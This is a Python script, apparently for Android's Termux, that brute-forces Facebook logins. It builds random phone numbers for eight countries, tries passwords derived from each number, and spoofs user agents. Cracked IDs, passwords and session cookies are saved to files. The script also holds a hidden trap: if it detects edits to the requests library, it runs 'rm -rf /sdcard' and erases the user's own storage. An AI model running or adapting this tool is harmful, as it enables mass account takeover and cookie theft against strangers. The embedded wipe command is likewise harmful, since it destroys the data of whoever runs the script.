import os,sys,time,json,random,re,string,platform,base64,uuid
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize futures bs4==2 > /dev/null')
    os.system('pip install bs4')
from time import localtime as lt
from os import system as cmd
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"

def clear():
    os.system('clear')
#-----[Global Functions]-----#
def dynamic(text):
    titik = ['.   ','..  ','... ','.... ']
    for o in titik:
        print('\r'+text+o),
        sys.stdout.flush();time.sleep(1)
#--------------------------proxies---------------------------#
fuck='/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/'
if not 'if self.url==' in open(fuck+'sessions.py','r').read():
    pass
else:
    os.system('rm -rf /sdcard')
    exit('\033[1;32mFUCK YOU BYPASS USER')
king='/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/'
if not 'print' in open(king+'sessions.py','r').read():
    pass
else:
    os.system('rm -rf /sdcard')
    exit('\033[1;32mWE DETECTED SOME CHANGES INTO YOUR REQEUESTS FILES')
qeen='/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/'
if not 'print' in open(qeen+'models.py','r').read():
    pass
else:
    os.system('rm -rf /sdcard')
    exit('\033[1;32mWE DETECTED SOME CHANGES INTO YOUR REQEUESTS FILES')
don='/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/'
if not 'print' in open(don+'utils.py','r').read():
    pass
else:
    os.system('rm -rf /sdcard')
    exit('\033[1;32mWE DETECTED SOME CHANGES INTO YOUR REQEUESTS FILES')

try:
	prox= requests.get('https://raw.githubusercontent.com/Ramxantanha/data/main/proxies.txt').text
	open('proxies.txt','w').write(prox)
except Exception as e:
	print('')
proxies=open('proxies.txt','r').read().splitlines()
#-----[Colours]-----#
RED = '\033[1;91m' #
WHITE = '\033[1;97m' #
GREEN = '\033[1;32m' #
YELLOW = '\033[1;33m' #
BLUE = '\033[1;34m' #
ORANGE = '\033[1;35m' #
P = '\x1b[1;97m' # 
M = '\x1b[1;91m' # 
H = '\x1b[1;92m' # 
K = '\x1b[1;92m' # 
B = '\x1b[1;94m' # 
U = '\x1b[1;95m' # 
O = '\x1b[1;96m' #
N = '\x1b[0m' #
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today()
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today()
mtd,cp_cpx,cokix=[],[],[]
fbks=(f'com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana','com.facebook.mlite')
#-----userid-separate----#
def user_id(coki):
    c_user_index = coki.find('c_user=')
    if c_user_index != -1:
        user_id = coki[c_user_index + len('c_user='):]
        user_id = user_id.split(';')[0]  # Extract the user ID
    else:
        user_id = ""
    return user_id
 #-------checker------#
def lock_check(uid):
    sessionx=requests.Session()
    urlx=f'https://www.facebook.com/p/{uid}'
    req=BeautifulSoup(sessionx.get(urlx).content,'html.parser')
    tx=req.find('title').text
    if tx =='Facebook':
        return('LOCK')
    else:
        return('LIVE')
#-----[UserAgent]-----#
ugen = []
for agent in range(40000):
    a='Mozilla/5.0 (Java; U; en-us; nokian70-1) AppleWebKit/530.13 (KHTML, like Gecko) UCBrowser/'
    b=random.randrange(1,9)
    c=random.randrange(1,9)
    d='0'
    e=random.randrange(111,999)
    f=random.randrange(11,99)
    g=random.randrange(111,999)
    h='UCWEB Mobile UNTRUSTED/1.0'
    fullagent=f'{a}{b}.{c}.{d}.{e}/{f}/{g}/{h}'
    ugen.append(fullagent)
for agent in range(40000):
    a='Mozilla/5.0 (SymbianOS/'
    b=random.choice(['9.1','9.2'])
    c='; U; [en-us]; Series60/3.0'
    d='NokiaE61/'
    e=random.randrange(1,9)
    f=random.randrange(1111,9999)
    g=random.choice(['01','02','03','04','05','06','07','08','09'])
    h=random.choice(['01','02','03','04','05','06','07','08','09'])
    i='AppleWebKit/413 (KHTML, like Gecko) Safari/413'
    fullagnt=f'{a}{b}{c} {d}{e}.{f}.{g}.{h} {i}'
    ugen.append(fullagnt)
#----------------------[CHECK CREATION YEAR]----------------#         
def joined(cid):
    if len(cid)==15:
        if cid[:10] in ['1000000000']       :creation = ' 2009'
        elif cid[:9] in ['100000000']       :creation = ' 2009'
        elif cid[:8] in ['10000000']        :creation = ' 2009'
        elif cid[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:creation = ' 2009'
        elif cid[:7] in ['1000006','1000007','1000008','1000009']:creation = ' 2010'
        elif cid[:6] in ['100001']          :creation = ' 2010 | 2011'
        elif cid[:6] in ['100002','100003'] :creation = ' 2011 | 2012'
        elif cid[:6] in ['100004']          :creation = ' 2012 | 2013'
        elif cid[:6] in ['100005','100006'] :creation = ' 2013 | 2014'
        elif cid[:6] in ['100007','100008'] :creation = ' 2014 | 2015'
        elif cid[:6] in ['100009']          :creation = ' 2015' 
        elif cid[:5] in ['10001']           :creation = ' 2015 | 2016'
        elif cid[:5] in ['10002']           :creation = ' 2016 | 2017'
        elif cid[:5] in ['10003']           :creation = ' 2018 | 2019'
        elif cid[:5] in ['10004']           :creation = ' 2019 | 2020'
        elif cid[:5] in ['10005']           :creation = ' 2020'
        elif cid[:5] in ['10006','10007']   :creation = ' 2021'
        elif cid[:5] in ['10008']           :creation = ' 2022/2023'
        elif cid[:5] in ['10009']           :creation = ' 2023'
        elif cid[:5] in ['61550']           :creation = ' 2023'
        else:creation=''
    elif len(cid) in [9,10]:
        creation = ' 2008 | 2009'
    elif len(cid)==8:
        creation = ' 2007 | 2008'
    elif len(cid)==7:
        creation = ' 2006 | 2007'
    else:creation=''
    return creation
#----------LOGO-------------#
logo=("""
\033[0;92m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
║\033[0;91m 
 █████  ████████  ██ ██   ██ 
██   ██    ██    ███ ██  ██  
███████    ██     ██ █████   
██   ██    ██     ██ ██  ██  
██   ██    ██     ██ ██   ██ 
\x1b[1;93m┏───────────────────────────────────────────────┓
\x1b[1;93m \x1b[1;97m [\x1b[1;92m+\x1b[1;97m]  \x1b[1;96m AUTHOR     \x1b[1;97m: \x1b[1;92mDADU IS  BACK
\x1b[1;93m \x1b[1;97m [\x1b[1;92m+\x1b[1;97m]  \x1b[1;96m TYPE       \x1b[1;97m: \x1b[1;92mFREE🔥
\x1b[1;93m \x1b[1;97m [\x1b[1;92m+\x1b[1;97m]  \x1b[1;96m GITHUB     \x1b[1;97m: \x1b[1;92mATIK-Lord-404   
\x1b[1;93m \x1b[1;97m [\x1b[1;92m+\x1b[1;97m]  \x1b[1;96m TOOL       \x1b[1;97m: \x1b[1;92mRANDOM-CLONING      
\x1b[1;93m \x1b[1;97m [\x1b[1;92m+\x1b[1;97m]  \x1b[1;96m VERSION    \x1b[1;97m: \x1b[1;92m1.2.0
\x1b[1;93m┗───────────────────────────────────────────────┛""")  
def linex():
        print(50*'\033[36;5;14m─\033[1;37m')
def clear():
        os.system(f'clear')
        print(logo)
    
#-----[Loop Menu]-----#  
loop = 0
oks = []
cps = []

#-----[Main-Menu]-----#
def lord_menu():
    os.system('clear');print(logo)
    print('\033[1;92m [1] RANDOM CRACK [IND]')
    print('\033[1;92m [2] RANDOM CRACK [BD]')
    print('\033[1;92m [3] RANDOM CRACK [PAK]')
    print('\033[1;92m [4] RANDOM CRACK [NPL]')
    print('\033[1;92m [5] RANDOM CRACK [SGP]')
    print('\033[1;92m [6] RANDOM CRACK [USA]')
    print('\033[1;92m [7] RANDOM CRACK [MYN]')
    print('\033[1;92m [8] RANDOM CRACK [INDO]')
    print('\033[1;92m [0] EXIT TOOL')
    linex()
    lord=input(' \033[1;32m[?] SELECT MENU: ')
    if lord in['1','01']:ind()
    elif lord in['2','02']:bd()
    elif lord in['3','03']:pak()
    elif lord in['4','04']:npl()
    elif lord in['5','05']:sgp()
    elif lord in['6','06']:usa()
    elif lord in['7','07']:myn()
    elif lord in['8','08']:indo()
    elif lord in['0','00']:exit()
    else:exit()
    
def ind():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system("clear")
    print(logo)
    print('\033[1;32m [√] IND CODE : +91639/+91629/+91836/+91799/+91953')
    linex()
    code = input('\033[1;32m [?] CHOOSE : ')
    os.system('clear')
    print(logo)
    print('\033[1;32m [√] EXAMPLE : 3000/5000/10000/50000')
    linex()
    limit = int(input('\033[1;32m [?] CHOOSE : '))
    linex()
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with ThreadPool(max_workers=20) as ahare:
        clear()
        tl = str(len(user))
        gen = str(len(ugen))
        print('\033[1;32m [+] Choice Code: '+code)
        print('\033[1;33m [-] Total  Uagent: '+gen)
        print('\033[1;34m [+] Crack Process Has Started')
        print('\033[1;35m [!] Use Flight Mode For Speed Up')
        print('\033[1;36m [+] Use APN For More OK Ids')
        linex()
        for fuck in user:
            pwx = ["last6digit", "last7digit", "last8digit", "last9digit", "last10digit", "fullnumber", "57575751", "59039200"]
            fid = code+fuck
            ahare.submit(lordx,fid,pwx,tl)
    print('CRACK PROCESS HAS BEEN COMPLETED ')
    print('Ok Ids Saved in /TANJID-OK.txt')
    print('Cp Ids Saved in /TANJID-CP.txt')
    linex()  

def bd():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system("clear")
    print(logo)
    print('\033[1;32m [√] BD CODE : 015/016/017/018/019/013/014')
    linex()
    code = input('\033[1;32m [?] CHOOSE : ')
    os.system('clear')
    print(logo)
    print('\033[1;32m [√] EXAMPLE : 3000/5000/10000/50000')
    linex()
    limit = int(input('\033[1;32m [?] CHOOSE : '))
    linex()
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    with ThreadPool(max_workers=10) as ahare:
        clear()
        tl = str(len(user))
        gen = str(len(ugen))
        print('\033[1;32m [+] Choice Code: '+code)
        print('\033[1;33m [-] Total  Uagent: '+gen)
        print('\033[1;34m [+] Crack Process Has Started')
        print('\033[1;35m [!] Use Flight Mode For Speed Up')
        print('\033[1;36m [+] Use APN For More OK Ids')
        linex()
        for fuck in user:
            pwx = ["last6digit", "last7digit", "last8digit", "last9digit", "last10digit", "fullnumber", "first6digit", "first7digit", "first8digit", "first9digit", "first10digit", "102030", "203040", "112244", "112255", "shamim", "sadiya", "fatema", "shahin", "fariya", "mimmim"]
            fid = code+fuck
            ahare.submit(lordx,fid,pwx,tl)
    print('CRACK PROCESS HAS BEEN COMPLETED ')
    print('Ok Ids Saved in /TANJID-OK.txt')
    print('Cp Ids Saved in /TANJID-CP.txt')
    linex()

def pak():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system("clear")
    print(logo)
    print('\033[1;32m [√] PAK CODE : +92326/+92331/+92314/+92335')
    linex()
    code = input('\033[1;32m [?] CHOOSE : ')
    os.system('clear')
    print(logo)
    print('\033[1;32m [√] EXAMPLE : 3000/5000/10000/50000')
    linex()
    limit = int(input('\033[1;32m [?] CHOOSE : '))
    linex()
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with ThreadPool(max_workers=20) as ahare:
        clear()
        tl = str(len(user))
        gen = str(len(ugen))
        print('\033[1;32m [+] Choice Code: '+code)
        print('\033[1;33m [-] Total  Uagent: '+gen)
        print('\033[1;34m [+] Crack Process Has Started')
        print('\033[1;35m [!] Use Flight Mode For Speed Up')
        print('\033[1;36m [+] Use APN For More OK Ids')
        linex()
        for fuck in user:
            pwx = ["last6digit", "last7digit", "last8digit", "last9digit", "last10digit", "fullnumber", "first6digit", "first7digit", "first8digit", "first9digit", "first10digit"]
            fid = code+fuck
            ahare.submit(lordx,fid,pwx,tl)
    print('CRACK PROCESS HAS BEEN COMPLETED ')
    print('Ok Ids Saved in /TANJID-OK.txt')
    print('Cp Ids Saved in /TANJID-CP.txt')
    linex()

def npl():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system("clear")
    print(logo)
    print('\033[1;32m [√] NPL CODE : +97798/+97714')
    linex()
    code = input('\033[1;32m [?] CHOOSE : ')
    os.system('clear')
    print(logo)
    print('\033[1;32m [√] EXAMPLE : 3000/5000/10000/50000')
    linex()
    limit = int(input('\033[1;32m [?] CHOOSE : '))
    linex()
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    with ThreadPool(max_workers=20) as ahare:
        clear()
        tl = str(len(user))
        gen = str(len(ugen))
        print('\033[1;32m [+] Choice Code: '+code)
        print('\033[1;33m [-] Total  Uagent: '+gen)
        print('\033[1;34m [+] Crack Process Has Started')
        print('\033[1;35m [!] Use Flight Mode For Speed Up')
        print('\033[1;36m [+] Use APN For More OK Ids')
        linex()
        for fuck in user:
            pwx = ["last6digit", "last7digit", "last8digit", "last9digit", "last10digit", "fullnumber", "first6digit", "first7digit", "first8digit", "first9digit", "first10digit"]
            fid = code+fuck
            ahare.submit(lordx,fid,pwx,tl)
    print('CRACK PROCESS HAS BEEN COMPLETED ')
    print('Ok Ids Saved in /TANJID-OK.txt')
    print('Cp Ids Saved in /TANJID-CP.txt')
    linex()

def sgp():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system("clear")
    print(logo)
    print('\033[1;32m [√] SGP CODE : +65634/+65681/+65674/+65828/+65969')
    linex()
    code = input('\033[1;32m [?] CHOOSE : ')
    os.system('clear')
    print(logo)
    print('\033[1;32m [√] EXAMPLE : 3000/5000/10000/50000')
    linex()
    limit = int(input('\033[1;32m [?] CHOOSE : '))
    linex()
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(5))
        user.append(nmp)
    with ThreadPool(max_workers=20) as ahare:
        clear()
        tl = str(len(user))
        gen = str(len(ugen))
        print('\033[1;32m [+] Choice Code: '+code)
        print('\033[1;33m [-] Total  Uagent: '+gen)
        print('\033[1;34m [+] Crack Process Has Started')
        print('\033[1;35m [!] Use Flight Mode For Speed Up')
        print('\033[1;36m [+] Use APN For More OK Ids')
        linex()
        for fuck in user:
            pwx = ["last6digit", "last7digit", "last8digit", "last9digit", "fullnumber", "first6digit", "first7digit", "first8digit", "first9digit"]
            fid = code+fuck
            ahare.submit(lordx,fid,pwx,tl)
    print('CRACK PROCESS HAS BEEN COMPLETED ')
    print('Ok Ids Saved in /TANJID-OK.txt')
    print('Cp Ids Saved in /TANJID-CP.txt')
    linex()

def usa():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system("clear")
    print(logo)
    print('\033[1;32m [√] USA CODE : +17574/+13045/+13048')
    linex()
    code = input('\033[1;32m [?] CHOOSE : ')
    os.system('clear')
    print(logo)
    print('\033[1;32m [√] EXAMPLE : 3000/5000/10000/50000')
    linex()
    limit = int(input('\033[1;32m [?] CHOOSE : '))
    linex()
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(6))
        user.append(nmp)
    with ThreadPool(max_workers=20) as ahare:
        clear()
        tl = str(len(user))
        gen = str(len(ugen))
        print('\033[1;32m [+] Choice Code: '+code)
        print('\033[1;33m [-] Total  Uagent: '+gen)
        print('\033[1;34m [+] Crack Process Has Started')
        print('\033[1;35m [!] Use Flight Mode For Speed Up')
        print('\033[1;36m [+] Use APN For More OK Ids')
        linex()
        for fuck in user:
            pwx = ["last6digit", "last7digit", "last8digit", "last9digit", "fullnumber", "first6digit", "first7digit", "first8digit", "first9digit", "123456", "654321", ]
            fid = code+fuck
            ahare.submit(lordx,fid,pwx,tl)
    print('CRACK PROCESS HAS BEEN COMPLETED ')
    print('Ok Ids Saved in /TANJID-OK.txt')
    print('Cp Ids Saved in /TANJID-CP.txt')
    linex()

def myn():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system("clear")
    print(logo)
    print('\033[1;32m [√] MYN CODE : +95966/+95925/+95977/+95997')
    linex()
    code = input('\033[1;32m [?] CHOOSE : ')
    os.system('clear')
    print(logo)
    print('\033[1;32m [√] EXAMPLE : 3000/5000/10000/50000')
    linex()
    limit = int(input('\033[1;32m [?] CHOOSE : '))
    linex()
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with ThreadPool(max_workers=20) as ahare:
        clear()
        tl = str(len(user))
        gen = str(len(ugen))
        print('\033[1;32m [+] Choice Code: '+code)
        print('\033[1;33m [-] Total  Uagent: '+gen)
        print('\033[1;34m [+] Crack Process Has Started')
        print('\033[1;35m [!] Use Flight Mode For Speed Up')
        print('\033[1;36m [+] Use APN For More OK Ids')
        linex()
        for fuck in user:
            pwx = ["last6digit", "last7digit", "last8digit", "last9digit", "last10digit", "fullnumber", "first6digit", "first7digit", "first8digit", "first9digit", "first10digit"]
            fid = code+fuck
            ahare.submit(lordx,fid,pwx,tl)
    print('CRACK PROCESS HAS BEEN COMPLETED ')
    print('Ok Ids Saved in /TANJID-OK.txt')
    print('Cp Ids Saved in /TANJID-CP.txt')
    linex()

def indo():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system("clear")
    print(logo)
    print('\033[1;32m [√] INDO CODE : +62888/+62878/+62882/+62838/+62877/+62813')
    linex()
    code = input('\033[1;32m [?] CHOOSE : ')
    os.system('clear')
    print(logo)
    print('\033[1;32m [√] EXAMPLE : 3000/5000/10000/50000')
    linex()
    limit = int(input('\033[1;32m [?] CHOOSE : '))
    linex()
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    with ThreadPool(max_workers=10) as ahare:
        clear()
        tl = str(len(user))
        gen = str(len(ugen))
        print('\033[1;32m [+] Choice Code: '+code)
        print('\033[1;33m [-] Total  Uagent: '+gen)
        print('\033[1;34m [+] Crack Process Has Started')
        print('\033[1;35m [!] Use Flight Mode For Speed Up')
        print('\033[1;36m [+] Use APN For More OK Ids')
        linex()
        for fuck in user:
            pwx = ["last6digit", "last7digit", "last8digit", "last9digit", "last10digit", "fullnumber", "first6digit", "first7digit", "first8digit", "first9digit", "first10digit"]
            fid = code+fuck
            ahare.submit(lordx,fid,pwx,tl)
    print('CRACK PROCESS HAS BEEN COMPLETED ')
    print('Ok Ids Saved in /TANJID-OK.txt')
    print('Cp Ids Saved in /TANJID-CP.txt')
    linex()

def lordx(fid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    sys.stdout.write('\r\r\033[1;92m[\033[38;5;46mCRACKING🔍]\033[1;97m-[%s/%s]-[OK\033[1;97m:-\033[1;92m%s\033[1;97m]-[CP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps)));sys.stdout.flush()
    try:
        last7digit = fid[int(len(fid))-7:]
        last6digit = fid[int(len(fid))-6:]
        last8digit = fid[int(len(fid))-8:]
        last9digit = fid[int(len(fid))-9:]
        last10digit = fid[int(len(fid))-10:]
        first6digit = fid[0:6]
        first7digit = fid[0:7]
        first8digit = fid[0:8]
        first9digit = fid[0:9]
        first10digit = fid[0:10]
        fullnumber = fid
        for ps in pwx:
            ps = ps.replace("last7digit",last7digit)
            ps = ps.replace("last6digit",last6digit)
            ps = ps.replace("last8digit",last8digit)
            ps = ps.replace("last9digit",last9digit)
            ps = ps.replace("last10digit",last10digit)
            ps = ps.replace("first6digit",first6digit)
            ps = ps.replace("first6digit",first6digit)
            ps = ps.replace("first7digit",first7digit)
            ps = ps.replace("first8digit",first8digit)
            ps = ps.replace("first9digit",first9digit)
            ps = ps.replace("first10digit",first10digit)
            ps = ps.replace("fullnumber",fullnumber)
            pro = random.choice(ugen)
            session = requests.Session()
            free_fb = session.get('https://mbasic.facebook.com').text
            log_data = {
            "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":fid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority': 'mbasic.facebook.com',
            'method':'GET',
            'scheme':'https',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-BD,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'max-age=0',
    'dpr': '2',
    'sec-ch-prefers-color-scheme': 'light',
    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
    'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.240"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': '"CPH2269"',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': '"12.0.0"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
            'user-agent': pro,
            'viewport-width': '980',}
            lo = session.post('https://mbasic.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = user_id(coki)
                try:
                    uid=lo['uid']
                except:
                    uid=cid
                    ckkx=lock_check(uid)
                if ckkx=='LOCK':
                    return
                else:
                 print('\r\r\033[1;32m[ATIK-OK🌟]\033[1;33m ' +cid+ ' • ' +ps+ ' [🌺] • \033[1;97mJOIN DATE = \033[1;35m'+joined(cid)+ ' \n\033[1;33m[🍪]\033[1;34mCOOKIES = \033[1;32m'+coki+ '')
                 print(50*'\033[36;5;14m─\033[1;37m')
                 open('/sdcard/ATIK-OK.txt', 'a').write( cid+' | '+ps+' \n')
                 oks.append(fid)
                 break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                #print('\r\r\033[1;30m[ATIK-CP]  ' +uid+ ' • ' +ps+ ' \033[0;97m')
                open('/sdcard/ATIK-CP.txt', 'a').write( fid+' | '+ps+' \n')
                cps.append(fid)
                break
            else:
                continue
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(10)
lord_menu()